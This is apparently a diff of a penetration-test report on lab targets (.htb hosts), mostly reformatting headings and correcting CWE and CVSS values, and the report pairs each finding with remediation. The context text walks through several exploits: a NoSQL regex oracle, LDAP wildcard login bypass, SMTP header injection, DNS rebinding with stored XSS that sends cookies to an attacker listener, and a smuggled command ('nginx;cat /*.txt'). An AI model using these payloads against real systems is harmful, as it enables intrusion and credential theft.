+#### Exploitation
 
 To confirm the flaw, the pentester navigated to the forum registration page at `[http://forum.royalflush.htb/create-account](http://forum.royalflush.htb/create-account)` and submitted the following registration form:
 
@@ -1289,7 +1291,7 @@ The application processed the request and created the account successfully:
 
 ![](assets/edited-svnmKRhJ.png){width="auto"}
 
-### Verification of Staff Status
+#### Verification of Staff Status
 
 After completing the email-verification step and logging in with the newly created account, the application executed the login handler:
 
@@ -1310,7 +1312,7 @@ session([
 
 #### Patching and Remediation
 
-###  Block Self-Registration with Internal Domain
+#### Block Self-Registration with Internal Domain
 
 Update `app/Http/Controllers/AuthController.php:handleCreateAccount` to reject any registration attempt using an `@royalflush.htb` email address:
 
@@ -1343,14 +1345,14 @@ public function handleCreateAccount(Request $request) {
 
 
 
-### Restrict Staff Account Provisioning
+#### Restrict Staff Account Provisioning
 
 Do not allow public self-registration for staff accounts under any condition. Implement an administrative control flow:
 
 * **Manual Admin Promotion:** An existing administrator explicitly toggles `is_staff = true` after verifying the identity of the user.
 * **Invitation-Only Provisioning:** Require staff to register using a cryptographically signed, single-use invitation link generated by an admin.
 
-###  Validate and Sanitize Input
+#### Validate and Sanitize Input
 
 Enforce native Laravel validation rules at the entry point of `handleCreateAccount` to harden input handling:
 
@@ -1365,13 +1367,13 @@ $request->validate([
 ```
 
 
-###  Audit Existing Accounts
+#### Audit Existing Accounts
 
 * Query the database for all existing accounts containing the `@royalflush.htb` domain.
 * Revoke staff access or demote any accounts created through the public registration interface.
 * Force a password reset for legitimate staff accounts if unauthorized access or session compromise is suspected.
 
-## Verification Criteria
+#### Verification Criteria
 
 * **Domain Restriction:** Registering with `attacker@royalflush.htb` triggers an explicit restriction error and halts account creation.
 * **Default Privilege Level:** All newly created users default to `is_staff = false`.
@@ -1493,7 +1495,7 @@ The pentester could now log in to the activated account. Because the email domai
 
 #### Patching and Remediation
 
-### 1. Eliminate the `$where` Operator
+#### 1. Eliminate the `$where` Operator
 
 Do **not** use MongoDB's `$where` operator with any user-controlled input. `$where` executes arbitrary JavaScript inside the database engine and cannot be safely parameterized, making it highly vulnerable to NoSQL Injection (SSJI).
 
@@ -1544,18 +1546,18 @@ private function invalidVerification()
 }
 ```
 
-### 2. Strict Input Validation
+#### 2. Strict Input Validation
 
 Validate and sanitize both `email` and `token` prior to performing database execution.
 
 * Enforce strict typing (`string`, `alpha_num`).
 * Require exact string lengths (`size:128`) to neutralize payload injection at the HTTP request layer before reaching MongoDB.
 
-### 3. One-Time Token Use
+#### 3. One-Time Token Use
 
 Always invalidate or delete the `VerificationToken` document immediately after a successful status change. This prevents token replay attacks and limits exposure if tokens leak via web server access logs or browser history.
 
-### 4. Token Expiration (TTL Check)
+#### 4. Token Expiration (TTL Check)
 
 Ensure verification tokens are short-lived. Store a timestamp during token creation and check for expiration against a designated Time-To-Live (e.g., 24 hours):
 
@@ -1599,7 +1601,7 @@ The application contains private, staff-only forum threads that are intended for
 
 Because the threads are readable by any staff or admin user (and by anyone who gains staff-level access), the credentials are exposed within the privileged boundary. An attacker who compromises or elevates to a staff account can read these private threads, extract the leaked password and related identity information, and reuse them to access other internal services such as `vault.royalflush.htb`.
 
-## Root Cause
+#### Root Cause
 
 The issue is not that regular users can view the threads—the threads are properly restricted to staff/admin users. The root cause is that plaintext credentials are being stored and transmitted through a multi-user staff channel:
 
@@ -1653,7 +1655,7 @@ The exposure of plaintext credentials within staff-only threads leads to the fol
 
 #### Detailed Walkthrough
 
-### 1. Browsing Staff-Only Threads
+#### 1. Browsing Staff-Only Threads
 
 After gaining staff-level access to the forum, review the private staff threads. In `thread/2`, a password-reset conversation is exposed in plaintext:
 
@@ -1671,7 +1673,7 @@ john: Thx, will do <3
 ![](assets/edited-APokibAN.png){width="auto"}
 
 
-### 2. Collecting Leaked Credentials
+#### 2. Collecting Leaked Credentials
 
 From this thread, extract the exposed sensitive data:
 
@@ -1679,7 +1681,7 @@ From this thread, extract the exposed sensitive data:
 * **Password:** `42zyTJ94BwdKjE******`
 * **Note:** Confirmation from `admin` that the user's email address matches the forum registration.
 
-### 3. Enumerating the Target Email Address
+#### 3. Enumerating the Target Email Address
 
 Reviewing `thread/4` reveals another post where the same user shared his Discord handle while offering administrative support:
 
@@ -1702,7 +1704,7 @@ Plaintext
 jdov****@royalflush.htb
 ```
 
-### 4. Credential Reuse Against Internal Vault
+#### 4. Credential Reuse Against Internal Vault
 
 Navigate to `[https://vault.royalflush.htb](https://vault.royalflush.htb)` and authenticate using the extracted credentials:
 
@@ -1782,7 +1784,7 @@ The Vault application's backup-email update feature is vulnerable to SQL injecti
 
 Because the backend uses Microsoft SQL Server and the connection is configured with database credentials, a successful injection can be escalated to dump arbitrary tables, extract sensitive records (such as stored passwords and user data), and read files from the underlying server using SQL Server primitives such as `OPENROWSET(BULK...)`, `xp_dirtree`, or error-based file reads.
 
-## Root Cause
+#### Root Cause
 
 The root cause is unsafe dynamic SQL construction combined with ineffective input validation:
 
@@ -2189,7 +2191,6 @@ The root cause is the use of an insecure deserializer on untrusted input:
 
 #### Patching and Remediation
 
-## Patching and Remediation
 
 1. **Remove BinaryFormatter entirely**
 
@@ -2271,7 +2272,7 @@ The root cause is the use of an insecure deserializer on untrusted input:
    
 
    ```c#
-   AppContext.SetSwitch("Switch.System.Runtime.Serialization.Formatters.Binary.BinaryFormatter.A deserialization vulnerability", true);
+   AppContext.SetSwitch("Switch.System.Runtime.Serialization.Formatters.Binary.BinaryFormatter.DangerousBinaryFormatterSerializationSwitch", true);
    ```
 
    However, this is only a temporary defense; complete removal is strongly recommended.
@@ -2290,7 +2291,7 @@ The root cause is the use of an insecure deserializer on untrusted input:
 
 #### CWE
 
-CWE-287
+CWE-90 (CWE-287 secondary)
 
 #### CVSS 4.0
 
@@ -2310,7 +2311,7 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N (8.8 - High)
 
 The LDAP authentication endpoint at ldap.vitamedix.htb fails to validate or escape user-supplied credentials before using them in an LDAP search or bind operation. Submitting the wildcard string `*` (or similar wildcard patterns) causes the LDAP query to match any user record instead of verifying a specific username/password pair. The application then treats the first matched entry — in this case an administrative account — as a successful login, disclosing the user list and emails such as <mic****@vitamedix.htb>.
 
-## How it works (typical vulnerable filter)
+#### How it works (typical vulnerable filter)
 
 A common vulnerable login query looks like:
 
@@ -2339,7 +2340,7 @@ Code snippet
 
 The \* character is the LDAP wildcard, so the filter evaluates to true for any entry with a uid and any entry with a userPassword, effectively returning the first directory object (often the admin account). The server-side code then assumes authentication succeeded because a result was returned.
 
-## Causes
+#### Causes
 
 1. Unsanitized input in LDAP filters — the username and password are concatenated directly into the LDAP query without escaping special characters (\*, (, ), , NUL).
 2. Missing input validation — no allowlist, length limit, or character-set check is applied to the credentials before they reach the LDAP layer.
@@ -2523,9 +2524,9 @@ script to automate it
   **Fixed Code**
 
 
-## Source Code Overview
+#### Source Code Overview
 
-### `reports.php`
+#### `reports.php`
 
 
 
@@ -2552,7 +2553,7 @@ exit;
 ?>
 ```
 
-### `render.php`
+#### `render.php`
 
 
 
@@ -2578,7 +2579,7 @@ $data = fetch_data($id);
 ?>
 ```
 
-### `config.php`
+#### `config.php`
 
 
 
@@ -2625,7 +2626,7 @@ The password-reset endpoint at `selfservice.vitamedix.htb/reset.php` is vulnerab
 
 An attacker submits a victim email followed by encoded carriage-return/line-feed characters (`%0d%0a`) and additional SMTP headers. The server includes those headers in the outgoing password-reset email, CC'ing/BCC'ing the specified address. The attacker then receives the reset email containing the victim's newly generated password.
 
-### Example Payload
+#### Example Payload
 
 
 ```http
@@ -2634,7 +2635,7 @@ email=michael%40vitamedix.htb%0d%0aCc:+smtp-dev@vitamedix.htb%0d%0aDAM:+
 
 * **Result:** The reset email for `michael@vitamedix.htb` is also delivered to `smtp-dev@vitamedix.htb`, exposing the new password.
 
-### Root Causes
+#### Root Causes
 
 1. **Unsanitized Email Input:** The `email` parameter is injected directly into mail headers without stripping `\r`, `\n`, or header injection sequences.
 2. **Header Concatenation:** The application manually constructs raw SMTP headers using unsanitized user input.
@@ -2821,7 +2822,7 @@ The `validateToken` function in `Vitamedix-master/src/database.js:112-129` is vu
 
 #### Detailed Walkthrough
 
-### Step 1 — Generate a registration token
+#### Step 1 — Generate a registration token
 
 The application exposes an unauthenticated endpoint that inserts a random 32-character hex token into the database:
 
@@ -2842,7 +2843,7 @@ Response:
 
 Note: An attacker does not strictly need to call this endpoint; as long as at least one token exists in the database, the boolean oracle below can be used to recover it.
 
-### Step 2 — Confirm the NoSQL injection oracle
+#### Step 2 — Confirm the NoSQL injection oracle
 
 Send a POST request to `/api/validateToken` with a CouchDB `$regex` operator instead of a literal token. Test whether the first character of the stored token is 0:
 
@@ -2885,7 +2886,7 @@ This confirms that:
 * The token field is injected directly into a Mango selector.
 * The endpoint returns a boolean oracle that leaks token characters one at a time.
 
-### Step 3 — Dump the full token
+#### Step 3 — Dump the full token
 
 Because the token is generated with `crypto.randomBytes(16).toString('hex')`, it is exactly 32 hexadecimal characters (`[0-9a-f]`). Using the boolean oracle from Step 2, iterate over each position and character set until the full token is recovered.
 
@@ -2909,7 +2910,7 @@ After 32 successful position checks, the recovered token is, for example:
 01f68f66cd3b7eed3a446a7cfd33b342
 ```
 
-### Step 4 — Register a user with the recovered token
+#### Step 4 — Register a user with the recovered token
 
 Submit the recovered token to `/api/register`:
 
@@ -2933,7 +2934,7 @@ Content-Type: application/json
 
 
 
-### Step 5 — Verify token reuse
+#### Step 5 — Verify token reuse
 
 Submit the same token again with a different username:
 
@@ -2979,7 +2980,7 @@ crypto.randomBytes(16).toString('hex')
 
 This always produces exactly 32 lowercase hexadecimal characters. We can therefore reject anything that does not match that strict pattern.
 
-### Fixed code
+#### Fixed code
 
 **`Vitamedix-master/vitamedix/vitamedix.htb/src/database.js`**
 
@@ -3021,7 +3022,7 @@ async validateToken(token) {
 }
 ```
 
-### Additional hardening recommendations
+#### Additional hardening recommendations
 
 1. **Single-use tokens**
 
@@ -3054,7 +3055,10 @@ async validateToken(token) {
 
 #### CWE
 
-CWE-79
+* CWE-79: Cross-site Scripting (XSS)
+* CWE-352: Cross-Site Request Forgery (CSRF)
+* CWE-346: Origin Validation Error (DNS-rebind pivot)
+* CWE-1392: Use of Default Credentials
 
 #### CVSS 4.0
 
@@ -3072,7 +3076,12 @@ CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N (8.7 - High)
 
 #### External References
 
-* https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+* [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+* [OWASP Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
+* [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
+* [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)
+* [CWE-346: Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)
+* [CWE-1392: Use of Default Credentials](https://cwe.mitre.org/data/definitions/1392.html)
 
 #### Description & Cause
 
@@ -3082,7 +3091,7 @@ Because the DNS server (Pi-hole) is reachable with the default password pihole, 
 
 The attacker’s redirect.php performs a cross-origin POST to /api/settings in the bot’s authenticated session. The settings endpoint has no CSRF protection (bodyParser.json({ type: () => true }) accepts any content type, and the session cookie lacks SameSite), so the request succeeds and updates full\_name to a JavaScript payload. The bot is then redirected to /settings, where {{ user.full\_name | safe }} renders the value without escaping and the stored XSS executes. The payload exfiltrates the bot’s session cookie to the attacker’s listener.
 
-### Vulnerable code locations
+#### Vulnerable code locations
 
 * src/helpers/URLHelper.js — resolves and checks the URL only once; no DNS pinning.
 * src/routes/index.js:80-88 — /api/documentSubmit forwards user URLs to bot.checkMessage.
@@ -3102,13 +3111,13 @@ The final impact is full compromise of the bot’s session. Because the bot runs
 
 #### Detailed Walkthrough
 
-### Prerequisites
+#### Prerequisites
 
 * Attacker machine IP: <Attacker_IP>
 * Pi-hole admin access already obtained via password `pihole`
 * A valid user session on [www.vitamedix.htb](http://www.vitamedix.htb) to submit a document URL
 
-### Step 1 — Hijack DNS resolution in Pi-hole
+#### Step 1 — Hijack DNS resolution in Pi-hole
 
 1. Log in to Pi-hole at `[http://dns.vitamedix.htb:8006/admin/login.php](http://dns.vitamedix.htb:8006/admin/login.php)` with password `pihole`.
 
@@ -3134,7 +3143,7 @@ The final impact is full compromise of the bot’s session. Because the bot runs
 
 From this point, all DNS queries routed through Pi-hole will be answered by the attacker machine, allowing controlled resolution of [www.vitamedix.htb](http://www.vitamedix.htb).
 
-### Step 2 — Start the DNS rebinder
+#### Step 2 — Start the DNS rebinder
 
 On the attacker machine, run:
 
@@ -3153,7 +3162,7 @@ sudo python3 dnsrebinder.py \
 
 * The  DNS query for [www.vitamedix.htb](http://www.vitamedix.htb) resolves to  <Attacker_IP> which leads to redirect.php
 
-### Step 3 — Prepare attacker servers
+#### Step 3 — Prepare attacker servers
 
 #### PHP server on port 4444
 
@@ -3179,7 +3188,7 @@ Start a Python listener:
 python3 -m http.server 4445
 ```
 
-### Step 4 — Submit the malicious document URL
+#### Step 4 — Submit the malicious document URL
 
 1. Log in to `[http://www.vitamedix.htb](http://www.vitamedix.htb)`.
 
@@ -3197,7 +3206,7 @@ python3 -m http.server 4445
 
 The application validates the URL: `URLHelper.validate` resolves [www.vitamedix.htb](http://www.vitamedix.htb) to 10.10.17.8, which is not blacklisted, so the URL is accepted. The internal bot then visits the same URL.
 
-### Step 5 — Payload execution in the bot’s browser
+#### Step 5 — Payload execution in the bot’s browser
 
 The bot loads `redirect.php`, which executes JavaScript in the bot’s authenticated browser context:
 
@@ -3242,7 +3251,7 @@ http://10.10.17.8:4445/?d=.....J...
 
 ![](assets/Screenshot-from-2026-08-12-10-32-27.png){width="auto"}
 
-### Step 6 — Capture the admin cookie
+#### Step 6 — Capture the admin cookie
 
 On the attacker machine, the Python listener receives a request similar to:
 
@@ -3272,7 +3281,7 @@ The chain relies on four weak points. Patch all of them; removing only one may s
 
 ***
 
-## 1. Pi-hole default credentials
+#### 1. Pi-hole default credentials
 
 Change the WEBPASSWORD in DNS-Server-master/dns-server/docker-compose.yml to a strong, randomly generated secret injected at deploy time, and do not expose the admin UI publicly.
 
@@ -3283,7 +3292,7 @@ Change the WEBPASSWORD in DNS-Server-master/dns-server/docker-compose.yml to a s
 
 ***
 
-## 2. Pin DNS resolution for bot / PDF fetches
+#### 2. Pin DNS resolution for bot / PDF fetches
 
 The bot in /api/documentSubmit currently passes the user URL straight to bot.checkMessage(url) with no IP pinning. Reuse the same pinning logic for both the PDF helper and the document-review bot.
 
@@ -3378,7 +3387,7 @@ Also sandbox the bot. The bot should run in a separate cookie jar / browser prof
 
 ***
 
-## 3. Fix stored XSS in profile rendering
+#### 3. Fix stored XSS in profile rendering
 
 Remove the | safe filter everywhere user.full\_name is rendered. Nunjucks autoescape: true will then encode the value safely.
 
@@ -3416,7 +3425,7 @@ Remove the | safe filter everywhere user.full\_name is rendered. Nunjucks autoes
 
 ***
 
-## 4. Add CSRF protection to state-changing endpoints
+#### 4. Add CSRF protection to state-changing endpoints
 
 Set the session cookie with SameSite=Strict, HttpOnly, and Secure, and validate an anti-CSRF token on POST /api/settings.
 
@@ -3457,7 +3466,7 @@ Include the token in the JWT payload when signing, and require it on POST /api/s
 
 ***
 
-## 5. Harden body-parser
+#### 5. Harden body-parser
 
 Remove the type: () => true override so JSON endpoints only accept application/json:
 
@@ -3475,7 +3484,7 @@ This prevents simple cross-origin text/plain fetch CSRF against JSON endpoints.
 
 #### CWE
 
-CWE-798
+CWE-918 (CWE-798 secondary)
 
 #### CVSS 4.0
 
@@ -3606,9 +3615,9 @@ In short, the SSRF collapses the trust boundary between the public-facing web ap
 
 ***
 
-## Fixed code
+#### Fixed code
 
-### 1. src/helpers/JWTHelper.js
+#### 1. src/helpers/JWTHelper.js
 
 ```js
   const jwt = require('jsonwebtoken');
@@ -3628,7 +3637,7 @@ In short, the SSRF collapses the trust boundary between the public-facing web ap
   };
 ```
 
-### 2. src/helpers/URLHelper.js
+#### 2. src/helpers/URLHelper.js
 
 ```js
   const dns = require('dns');
@@ -3700,7 +3709,7 @@ In short, the SSRF collapses the trust boundary between the public-facing web ap
   module.exports = { validate };
 ```
 
-### 3. src/helpers/PDFHelper.js
+#### 3. src/helpers/PDFHelper.js
 
 ```js
   const fs = require('fs');
@@ -3742,7 +3751,7 @@ In short, the SSRF collapses the trust boundary between the public-facing web ap
 
 > Production hardening: use a dedicated egress proxy or microservice with no access to internal metadata/CouchDB. Pass the pre-resolved public IP to the fetcher and enforce the Host header there.
 
-### 4. src/middleware/DoctorMiddleware.js
+#### 4. src/middleware/DoctorMiddleware.js
 
 ```js
   const db = require('../database'); // or inject the db instance
@@ -3767,7 +3776,7 @@ In short, the SSRF collapses the trust boundary between the public-facing web ap
   };
 ```
 
-### 5. src/database.js
+#### 5. src/database.js
 
 ```js
   const crypto = require('crypto');
@@ -3786,7 +3795,7 @@ In short, the SSRF collapses the trust boundary between the public-facing web ap
   }
 ```
 
-### 6. config/local.ini
+#### 6. config/local.ini
 
 ```ini
   [admins]
@@ -3795,7 +3804,7 @@ In short, the SSRF collapses the trust boundary between the public-facing web ap
 
 At container start, generate or inject a strong password and write it into the CouchDB config instead of committing credentials to version control.
 
-### 7. src/routes/index.js – endpoint usage
+#### 7. src/routes/index.js – endpoint usage
 
 ```js
   router.post('/api/pdfGeneration', [AuthMiddleware, DoctorMiddleware], async (req, res) => {
@@ -3822,7 +3831,7 @@ At container start, generate or inject a strong password and write it into the C
 
 #### CWE
 
-CWE-78
+CWE-95
 
 #### CVSS 4.0
 
@@ -3835,7 +3844,6 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (9.4 - Critical)
 #### External References
 
 * [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
-* [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
 * [CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')](https://cwe.mitre.org/data/definitions/95.html)
 
 #### Description & Cause
@@ -4914,7 +4922,7 @@ The admin access controls in admin_panel.php and session_manager.php rely on two
      );                                                                                                                                                                                      
                                                                                                                                                                                              
      INSERT INTO `users` (`username`, `role`, `password`) VALUES                                                                                                                             
-     ('testdeveloper', 1, '$2a$12$hstCruIkPcUmcUBlE6lHYe23A3d6tqIAnpLBdAM/10B0Dk3LJqV/a');                                                                                                   
+     ('developer', 1, '$2a$12$hstCruIkPcUmcUBlE6lHYe23A3d6tqIAnpLBdAM/10B0Dk3LJqV/a');                                                                                                   
    ```                                                                                                                                                                                       
                                                                                                                                                                                              
    2. session.php                                                                                                                                                                            
@@ -5156,7 +5164,7 @@ CWE-444
 
 #### CVSS 4.0
 
-CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N (6.3 - Medium)
+CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N (5.3 - Medium)
 
 #### Affected Component(s)
 
@@ -5192,8 +5200,8 @@ CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N (6.3 - Medium)
    Receiving two separate responses for a single request proves that the back-end processed the embedded request independently from the original request. This allows an attacker to route   
    requests to the internal back-end server and bypass front-end routing or access controls.                                                                                                 
                                                                                                                                                                                              
-   Successful exploitation allows an attacker to send requests to internal endpoints that are not directly exposed, including the command-injection flaw in /service_status, leading to      
-   remote code execution without requiring the XSS/cache-poisoning chain.                                                                                                                    
+   Successful exploitation allows an attacker to send requests to internal endpoints that are not directly exposed. If combined with other vulnerabilities, such as the command-injection   
+   flaw in /service_status, this access could be leveraged for further attacks.                                                                                                              
                                                                                                                                                                                              
    Causes                                                                                                                                                                                    
                                                                                                                                                                                              
@@ -5225,17 +5233,10 @@ CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N (6.3 - Medium)
    2. Access to internal endpoints                                                                                                                                                           
       Because the smuggled request is processed by the internal back-end at 127.0.0.1:8000, the attacker can reach endpoints such as /service_status on api.securedata.htb that are not      
       directly exposed to external users.                                                                                                                                                    
-                                                                                                                                                                                             
-   3. Remote code execution without user interaction                                                                                                                                         
-      By smuggling requests to the vulnerable /service_status endpoint, an attacker can exploit the OS command injection flaw directly — no administrator visit, XSS, or cache poisoning is  
-      required. This enables arbitrary command execution on the internal API host.                                                                                                           
-                                                                                                                                                                                             
-   4. Session hijacking and unauthorized actions                                                                                                                                             
-      The attacker can smuggle authenticated requests that reuse or steal session cookies, perform actions as legitimate users, or access privileged functionality intended only for internal
-      services.                                                                                                                                                                              
-                                                                                                                                                                                             
 
-
+   3. Potential for further attacks when chained with other vulnerabilities
+      Reaching an internal endpoint such as /service_status increases attack surface. If a separate vulnerability exists on that endpoint, the smuggled access path could be used to escalate
+      impact. In this assessment, the smuggled request produced a 403 Forbidden response; command execution or data corruption was not demonstrated.
 
 #### Detailed Walkthrough
 
@@ -5813,7 +5814,7 @@ CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (7.5 - High)
 
 #### Detailed Walkthrough
 
-### 1. Start the attacker listener
+#### 1. Start the attacker listener
 
 On the attacker machine, start a Netcat listener on the port referenced in the XSS payload (in this example, `4444`):
 
@@ -5830,17 +5831,17 @@ nc -lvnp 4444
 
 Confirm the listener is active and reachable from the target environment before proceeding.
 
-### 2. Poison the cache
+#### 2. Poison the cache
 
 Run a script that repeatedly sends a request containing the XSS payload in the `Client-IP` header (e.g., every 3 seconds), to keep the cache entry poisoned while waiting for the victim to load the page.
 
 Payload script: [api-securedata-RCE.py](exploits/api-securedata-RCE.py)
 
-### 3. Victim visits the poisoned page
+#### 3. Victim visits the poisoned page
 
 When the authenticated administrator loads the affected page, the cached response containing the XSS payload is served. The injected JavaScript executes in the administrator's browser context.
 
-### 4. XSS triggers command injection
+#### 4. XSS triggers command injection
 
 The executed payload sends a request to the internal API endpoint:
 
@@ -5852,11 +5853,11 @@ The semicolon terminates the intended `service` argument and appends `whoami`, w
 
 ![](assets/edited-MLMEo4pw.png){width="auto"}
 
-### 5. Response is exfiltrated to the listener
+#### 5. Response is exfiltrated to the listener
 
 The server's response, including the output of `whoami`, is relayed to the attacker's listener as an HTTP request. The Netcat terminal shows incoming requests containing base64-encoded data. Decoding this data confirms command execution.
 
-### 6. Escalate to arbitrary file read
+#### 6. Escalate to arbitrary file read
 
 The payload is updated to read text files from the server's filesystem:
 
@@ -5871,11 +5872,11 @@ GET http://api.securedata.htb/service_status?service=nginx;cat /*.txt
 
 ![](assets/edited-yM37U7I6.png){width="auto"}
 
-### 7. Flag / sensitive file captured
+#### 7. Flag / sensitive file captured
 
 The server returns the contents of `.txt`  files in the root directory, including the flag file. The XSS payload forwards this data to the attacker's listener; the attacker decodes the base64 output in Netcat to recover the file contents.
 
-### Flag: `85cef6bf6a0a68f45c8d6eb37f2cb79c`
+#### Flag: `85cef6bf6a0a68f45c8d6eb37f2cb79c`
 
 ***
 
